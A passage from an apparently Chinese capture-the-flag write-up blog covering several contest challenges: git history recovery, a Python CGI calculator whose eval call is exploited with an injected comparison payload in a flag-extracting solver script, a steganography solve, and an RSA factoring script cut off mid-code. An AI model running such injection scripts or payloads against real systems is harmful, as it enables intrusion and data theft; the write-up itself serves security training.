class="number">0xF4D50D87</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">8</span>], S24,<span class="number">0x455A14ED</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">13</span>],S21,<span class="number">0xA9E3E905</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">2</span>], S22,<span class="number">0xFCEFA3F8</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">7</span>], S23,<span class="number">0x676F02D9</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">12</span>],S24,<span class="number">0x8D2A4C8A</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">5</span>], S31,<span class="number">0xFFFA3942</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">8</span>], S32,<span class="number">0x8771F681</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">11</span>],S33,<span class="number">0x6D9D6122</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">14</span>],S34,<span class="number">0xFDE5380C</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">1</span>], S31,<span class="number">0xA4BEEA44</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">4</span>], S32,<span class="number">0x4BDECFA9</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">7</span>], S33,<span class="number">0xF6BB4B60</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">10</span>],S34,<span class="number">0xBEBFBC70</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">13</span>],S31,<span class="number">0x289B7EC6</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">0</span>], S32,<span class="number">0xEAA127FA</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">3</span>], S33,<span class="number">0xD4EF3085</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">6</span>], S34,<span class="number">0x4881D05</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">9</span>], S31,<span class="number">0xD9D4D039</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">12</span>],S32,<span class="number">0xE6DB99E5</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">15</span>],S33,<span class="number">0x1FA27CF8</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">2</span>], S34,<span class="number">0xC4AC5665</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">0</span>], S41,<span class="number">0xF4292244</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">7</span>], S42,<span class="number">0x432AFF97</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">14</span>],S43,<span class="number">0xAB9423A7</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">5</span>], S44,<span class="number">0xFC93A039</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">12</span>],S41,<span class="number">0x655B59C3</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">3</span>], S42,<span class="number">0x8F0CCC92</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">10</span>],S43,<span class="number">0xFFEFF47D</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">1</span>], S44,<span class="number">0x85845DD1</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">8</span>], S41,<span class="number">0x6FA87E4F</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">15</span>],S42,<span class="number">0xFE2CE6E0</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">6</span>], S43,<span class="number">0xA3014314</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">13</span>],S44,<span class="number">0x4E0811A1</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">4</span>], S41,<span class="number">0xF7537E82</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">11</span>],S42,<span class="number">0xBD3AF235</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">2</span>], S43,<span class="number">0x2AD7D2BB</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">9</span>], S44,<span class="number">0xEB86D391</span>);</span><br><span class="line">           a=AddUnsigned(a,AA);</span><br><span class="line">           b=AddUnsigned(b,BB);</span><br><span class="line">           c=AddUnsigned(c,CC);</span><br><span class="line">           d=AddUnsigned(d,DD);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> temp.toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#login-form"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (md5($(<span class="string">"#password"</span>).val()).toLowerCase() === <span class="string">"698967f805dea9ea073d188d73ab7390"</span>) &#123;</span><br><span class="line">            $(<span class="string">"html"</span>).html(<span class="string">"&lt;h1&gt;Login Succeeded!&lt;/h1&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $(<span class="string">"html"</span>).html(<span class="string">"&lt;h1&gt;Login Failed!&lt;/h1&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其实就是那个md5解密，这些都是虚的</p><h2 id="金融业网络安全攻防比赛热身赛"><a href="#金融业网络安全攻防比赛热身赛" class="headerlink" title="金融业网络安全攻防比赛热身赛"></a>金融业网络安全攻防比赛热身赛</h2><h3 id="babygit"><a href="#babygit" class="headerlink" title="babygit"></a>babygit</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git log</span><br><span class="line">commit 96bc79270bdd8ff7858e73eb77d73a2bf93aa085 (HEAD -&gt; master)</span><br><span class="line">Author: Admin &lt;admin@example.com&gt;</span><br><span class="line">Date:   Wed Jul 25 06:16:26 2018 +0000</span><br><span class="line"></span><br><span class="line">    add message</span><br><span class="line"></span><br><span class="line">commit bb0c97ee3c3e08403ce50391d1ae110ce6d6d41c</span><br><span class="line">Author: Admin &lt;admin@example.com&gt;</span><br><span class="line">Date:   Wed Jul 25 06:16:26 2018 +0000</span><br><span class="line"></span><br><span class="line">    add flag</span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git reset bb0c97ee3c3e08403ce50391d1ae110ce6d6d41c</span><br><span class="line">重置后取消暂存的变更：</span><br><span class="line">D flag.txt</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git checkout flag.txt</span><br><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ ls</span><br><span class="line">50x.html  flag.txt  index.html  README.md</span><br><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ cat flag.txt</span><br><span class="line">flag&#123;G1t_D1s?1&#125;</span><br></pre></td></tr></table></figure><h3 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Calculate<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Calculate<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">t</span> <span class="attr">placeholder</span>=<span class="string">'Input your team token'</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">value1</span> <span class="attr">placeholder</span>=<span class="string">'Value 1 (Example: 1  abc)'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">op</span> <span class="attr">placeholder</span>=<span class="string">'Operator (Example: + - * ** / // == != )'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">value2</span> <span class="attr">placeholder</span>=<span class="string">'Value 2 (Example: 1  abc)'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4 btn btn-success"</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">EVAL</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'?source=1'</span>&gt;</span>Source<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>#!/usr/bin/env python3</span><br><span class="line">import cgi;</span><br><span class="line">import sys</span><br><span class="line">from html import escape</span><br><span class="line">from secret import get_flag</span><br><span class="line"></span><br><span class="line">OK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html</span><br><span class="line"></span><br><span class="line">&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;</span><br><span class="line">&amp;lt;center&amp;gt;</span><br><span class="line">&amp;lt;title&amp;gt;Calculate&amp;lt;/title&amp;gt;</span><br><span class="line">&amp;lt;h1&amp;gt;Calculate&amp;lt;/h1&amp;gt;</span><br><span class="line">&amp;lt;form&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=t placeholder=&amp;#x27;Input your team token&amp;#x27; %s /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&amp;#x27;Value 1 (Example: 1  abc)&amp;#x27; /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&amp;#x27;Operator (Example: + - * ** / // == != )&amp;#x27; /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&amp;#x27;Value 2 (Example: 1  abc)&amp;#x27; /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;</span><br><span class="line">&amp;lt;/form&amp;gt;</span><br><span class="line">&amp;lt;a href=&amp;#x27;?%ssource=1&amp;#x27;&amp;gt;Source&amp;lt;/a&amp;gt;</span><br><span class="line">&amp;lt;/center&amp;gt;</span><br><span class="line">&amp;quot;&amp;quot;&amp;quot;</span><br><span class="line"></span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line">if &amp;#x27;t&amp;#x27; in arguments:</span><br><span class="line">    token = str(arguments[&amp;#x27;t&amp;#x27;].value)</span><br><span class="line">    print(OK_200 % (&amp;quot;value=&amp;quot;+token+&amp;#x27; readonly&amp;#x27;, &amp;quot;t=&amp;quot;+token+&amp;quot;&amp;amp;&amp;quot;))</span><br><span class="line">else:</span><br><span class="line">    print(OK_200 % (&amp;quot;&amp;quot;, &amp;quot;&amp;quot;))</span><br><span class="line"></span><br><span class="line">if &amp;#x27;source&amp;#x27; in arguments:</span><br><span class="line">    source = arguments[&amp;#x27;source&amp;#x27;].value</span><br><span class="line">else:</span><br><span class="line">    source = 0</span><br><span class="line"></span><br><span class="line">if source == &amp;#x27;1&amp;#x27;:</span><br><span class="line">    print(&amp;#x27;&amp;lt;pre&amp;gt;&amp;#x27;+escape(str(open(__file__,&amp;#x27;r&amp;#x27;).read()))+&amp;#x27;&amp;lt;/pre&amp;gt;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">if &amp;#x27;value1&amp;#x27; in arguments and &amp;#x27;value2&amp;#x27; in arguments and &amp;#x27;op&amp;#x27; in arguments and &amp;#x27;t&amp;#x27; in arguments:</span><br><span class="line"></span><br><span class="line">    FLAG = &amp;#x27;flag&#123;&amp;#x27; + get_flag(arguments[&amp;#x27;t&amp;#x27;].value) + &amp;#x27;&#125;&amp;#x27;</span><br><span class="line"></span><br><span class="line">    def get_value(val):</span><br><span class="line">        val = str(val)[:64]</span><br><span class="line">        if str(val).isdigit(): return int(val)</span><br><span class="line">        blacklist = [&amp;#x27;(&amp;#x27;,&amp;#x27;)&amp;#x27;,&amp;#x27;[&amp;#x27;,&amp;#x27;]&amp;#x27;,&amp;#x27;\&amp;#x27;&amp;#x27;,&amp;#x27;&amp;quot;&amp;#x27;] # I don&amp;#x27;t like tuple, list and dict.</span><br><span class="line">        if val == &amp;#x27;&amp;#x27; or [c for c in blacklist if c in val] != []:</span><br><span class="line">            print(&amp;#x27;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&amp;#x27;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        return val</span><br><span class="line"></span><br><span class="line">    def get_op(val):</span><br><span class="line">        val = str(val)[:2]</span><br><span class="line">        list_ops = [&amp;#x27;+&amp;#x27;,&amp;#x27;-&amp;#x27;,&amp;#x27;/&amp;#x27;,&amp;#x27;*&amp;#x27;,&amp;#x27;=&amp;#x27;,&amp;#x27;!&amp;#x27;]</span><br><span class="line">        if val == &amp;#x27;&amp;#x27; or val[0] not in list_ops:</span><br><span class="line">            print(&amp;#x27;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&amp;#x27;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        return val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[&amp;#x27;op&amp;#x27;].value)</span><br><span class="line">    value1 = get_value(arguments[&amp;#x27;value1&amp;#x27;].value)</span><br><span class="line">    value2 = get_value(arguments[&amp;#x27;value2&amp;#x27;].value)</span><br><span class="line"></span><br><span class="line">    if str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(&amp;#x27;&amp;lt;center&amp;gt;Types of the values don\&amp;#x27;t match&amp;lt;/center&amp;gt;&amp;#x27;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line"></span><br><span class="line">    print(&amp;#x27;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&amp;#x27;)</span><br><span class="line">    print(&amp;#x27;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&amp;#x27;+escape(calc_eval)+&amp;#x27;)&amp;#x27;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        if result.isdigit() or result == &amp;#x27;True&amp;#x27; or result == &amp;#x27;False&amp;#x27;:</span><br><span class="line">            print(result)</span><br><span class="line">        else:</span><br><span class="line">            print(&amp;quot;Invalid&amp;quot;) # Sorry we don&amp;#x27;t support output as a string due to security issue.</span><br><span class="line">    except:</span><br><span class="line">        print(&amp;quot;Invalid&amp;quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(&amp;#x27;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://54.223.83.192:8888/cgi-bin/calculate.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s,t=hh)</span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment">#print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">'Invalid'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'True'</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, "\t",</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, v2, op, s ,hh= <span class="string">'x'</span>, <span class="string">"+FLAG&lt;value1+source#"</span>, <span class="string">"+'"</span>, <span class="string">''</span>,<span class="string">"1a69aa60224a7095ececda5c7c6834fc"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>参考：<a href="https://xz.aliyun.com/t/2456" target="_blank" rel="noopener">https://xz.aliyun.com/t/2456</a></p><h2 id="网鼎杯wp"><a href="#网鼎杯wp" class="headerlink" title="网鼎杯wp"></a>网鼎杯wp</h2><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张<code>zsteg 6.png</code><br>出flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">imagedata           .. text: &quot;-+,554$&amp;&amp;&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;^;lI;bN$&quot;</span><br><span class="line">b1,bgr,lsb,xy       .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\nq&quot;</span><br><span class="line">b2,b,msb,xy         .. file: Encore - version 8432</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;iEsx\&quot;gwN)&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;yEsx\&quot;gwN)&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;&#123;OL?i9Ww&quot;</span><br></pre></td></tr></table></figure></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>首先求出q,p<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span></span><br><span class="line">  p = <span class="number">1</span></span><br><span class="line">  q = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:</span><br><span class="line">    k = d * e - <span class="number">1</span></span><br><span class="line">    g = random.randint ( <span class="number">0</span> , n )</span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">      k /= <span class="number">2</span></span><br><span class="line">      y = pow(g,k,n)</span><br><span class="line">      <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:</span><br><span class="line">        p = gcd(y<span class="number">-1</span>,n)</span><br><span class="line">        q = n/p</span><br><span class="line">  <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  n =<span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line">  e = <span class="number">65537</span></span><br><span class="line">  d = <span class="number">171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289</span></span><br><span class="line">  p,q = getpq(n,e,d)</span><br><span class="line">  <span class="keyword">print</span> hex(p),hex(q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 